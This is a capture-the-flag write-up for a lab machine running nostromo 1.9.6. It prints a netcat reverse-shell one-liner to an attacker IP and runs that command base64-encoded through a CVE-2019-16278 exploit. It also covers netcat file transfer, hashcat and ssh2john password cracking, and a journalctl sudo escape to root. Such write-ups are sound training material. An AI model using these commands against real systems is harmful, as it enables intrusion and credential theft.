User Flag
----

1. Map ports and versions
2. nostromo 1.9.6
3. Searchsploit
4. CVE-2019-16278
5. Reverse shell
6. Go to `home/david/public_www`
7. Download Tar file
8. ssh2john
9. hashcat
10. ssh as david with id_rsa and password
11. User flag in `/home/david/user.txt`

Notes
----

## Reverse shell with CVE-2019-16278

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/f" | base64
```

```shell
python3 CVE-2019-16278.py 10.10.10.165 80 'echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjExIDQ0NDQgPi90bXAvZg" | base64 --decode | sh'
```

## Find where to write

Best place is /tmp

```
find / -type d -writable
```

## Hashcat for password found on .htpasswd

Actually not used, but good to know

```shell

Session..........: hashcat
Status...........: Running
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
Time.Started.....: Thu Feb 22 00:08:46 2024 (35 secs)
Time.Estimated...: Thu Feb 22 00:10:41 2024 (1 min, 20 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   124.7 kH/s (10.77ms) @ Accel:32 Loops:250 Thr:32 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 4347904/14344384 (30.31%)
Rejected.........: 0/4347904 (0.00%)Restore.Point....: 4347904/14344384 (30.31%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidate.Engine.: Device GeneratorCandidates.#1....: redskins127 -> rdbrules
Hardware.Mon.#1..: Temp: 49c Fan:  0% Util: 26% Core:1530MHz Mem:4001MHz Bus:16

$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:*********
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
Time.Started.....: Thu Feb 22 00:08:46 2024 (1 min, 30 secs)
Time.Estimated...: Thu Feb 22 00:10:16 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   120.2 kH/s (11.86ms) @ Accel:32 Loops:250 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10790912/14344384 (75.23%)
Rejected.........: 0/10790912 (0.00%)
Restore.Point....: 10768384/14344384 (75.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidate.Engine.: Device Generator
Candidates.#1....: OVERCLOCKING11091984 -> NOV241968
Hardware.Mon.#1..: Temp: 53c Fan:  0% Util: 30% Core:1530MHz Mem:4001MHz Bus:16

Started: Thu Feb 22 00:08:45 2024
Stopped: Thu Feb 22 00:10:17 2024
```

## How to find the ssh file

The configuration file is in `/etc/nostromo/nhttpd.conf`

What is doing here is mapping the home of the user to the public_www directory

So user `david` has a home directory in `/home/david` and the public_www directory is `/home/david/public_www`

```
# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

## Download the tar file

```
nc -lvnp 1337 > backup.tar.gz
```

```
nc 10.10.14.7 1337 < backup.tar.gz
```

## Crack the password

https://robertholdsworthsecurity.medium.com/how-to-crack-an-ssh-private-key-passphrase-ab7dd1583178

```
./hashcat -a 0 -m 22931 ../wordlists/users/ssh_david.txt ../wordlists/rockyou.txt
```

## SSH as david

```
ssh -i id_rsa david@<IP>
```

Root FLAG
----

With linpeas I found the following file which contains a bin which is being called with sudo

```
You own the script: /home/david/bin/server-stats.sh                                                                                                                                 
/usr/bin/gettext.sh 
```

So what we have to do is call it but without the `usr/bin/cat` and since is journalctl is going to open a `less` by default were we can use `https://gtfobins.github.io/gtfobins/journalctl/` to get root

### Links used
- https://gtfobins.github.io/gtfobins/journalctl/
- https://robertholdsworthsecurity.medium.com/how-to-crack-an-ssh-private-key-passphrase-ab7dd1583178
- https://nvd.nist.gov/vuln/detail/CVE-2019-16278
- https://nvd.nist.gov/vuln/detail/CVE-2021-3156
- https://askubuntu.com/questions/178521/how-can-i-decode-a-base64-string-from-the-command-line
- https://www.base64encode.org/
- https://hashcat.net/wiki/doku.php?id=example_hashes
- https://hashcat.net/wiki/doku.php?id=hashcat